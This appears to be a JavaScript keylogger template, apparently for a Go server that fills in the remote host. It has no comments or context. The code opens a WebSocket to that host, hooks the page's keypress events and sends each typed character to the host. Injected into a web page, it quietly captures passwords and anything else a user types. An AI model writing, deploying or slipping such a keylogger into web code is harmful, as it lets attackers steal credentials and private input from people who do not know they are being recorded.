(function(){
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress =keypres;
    function keypres(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();